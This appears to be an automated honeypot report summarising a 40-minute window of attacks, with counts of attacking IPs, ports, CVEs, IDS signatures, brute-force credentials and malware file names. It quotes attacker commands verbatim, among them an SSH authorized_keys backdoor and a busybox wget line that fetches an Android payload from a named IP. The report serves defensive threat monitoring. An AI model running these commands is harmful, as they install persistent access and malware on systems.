Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-23T13:01:51Z
**Timeframe:** 2025-10-23T12:20:01Z to 2025-10-23T13:00:01Z
**Files:** agg_log_20251023T122001Z.json, agg_log_20251023T124001Z.json, agg_log_20251023T130001Z.json

**Executive Summary**
This report summarizes honeypot activity over a 40-minute interval, aggregating data from three separate log files. A total of 17,843 attacks were recorded, with Honeytrap, Cowrie, and Suricata being the most frequently triggered honeypots. The primary attack vectors appear to be SMB and SSH, with a significant number of attempts to install backdoors and execute reconnaissance commands. A small number of CVEs were targeted.

**Detailed Analysis**

***Attacks by Honeypot***
* Honeytrap: 6193
* Cowrie: 4443
* Suricata: 4289
* Ciscoasa: 1719
* Sentrypeer: 846
* H0neytr4p: 98
* Dionaea: 97
* Tanner: 91
* Mailoney: 20
* Redishoneypot: 17
* Adbhoney: 13
* Miniprint: 9
* ElasticPot: 5
* Wordpot: 2
* Honeyaml: 1

***Top Attacking IPs***
* 109.205.211.9: 1685
* 102.90.96.226: 1521
* 134.209.192.157: 284
* 181.212.34.237: 257
* 151.236.52.78: 223
* 52.250.16.220: 218
* 137.184.72.181: 208
* 159.89.192.21: 188

***Top Targeted Ports/Protocols***
* TCP/445: 1519
* 5060: 846
* 22: 630

***Most Common CVEs***
* CVE-2016-6563
* CVE-2019-11500
* CVE-2021-3449

***Commands Attempted by Attackers***
* `cd ~; chattr -ia .ssh; lockr -ia .ssh`: 22
* `lockr -ia .ssh`: 22
* `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ... mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~`: 22
* `cat /proc/cpuinfo | grep name | wc -l`: 22
* `w`: 22
* `uname -m`: 22
* `Enter new UNIX password: `: 17

***Signatures Triggered***
* ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication: 1519
* ET SCAN MS Terminal Server Traffic on Non-standard Port: 1163
* ET HUNTING RDP Authentication Bypass Attempt: 555
* ET DROP Dshield Block Listed Source group 1: 266
* ET SCAN NMAP -sS window 1024: 164

***Users / Login Attempts***
* 345gs5662d34/345gs5662d34: 21
* sa/112233: 10
* root/citel.telecom: 4
* root/Cisco2323: 4
* root/ciscosunbcu123: 4
* root/cismail8088: 4
* root/cithmakdop: 4

***Files Uploaded/Downloaded***
* Mozi.m: 6
* sh: 6
* wget.sh;: 4
* arm.urbotnetisass;: 2

***HTTP User-Agents***
* No user agents were recorded in the logs.

***SSH Clients and Servers***
* No SSH clients or servers were recorded in the logs.

***Top Attacker AS Organizations***
* No AS organizations were recorded in the logs.

**Key Observations and Anomalies**
* The high number of triggers for the "DoublePulsar Backdoor" signature suggests a targeted campaign against SMB vulnerabilities.
* The commands executed by attackers are primarily focused on reconnaissance and establishing persistent access through SSH authorized_keys.
* The `mdrfckr` comment in the SSH key is a common signature of a specific botnet.
* The variety of usernames and passwords attempted indicates a brute-force approach, likely using common credential lists.
* A notable command `cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/arm.urbotnetisass; ...` was observed, which attempts to download and execute a malicious payload for Android devices.
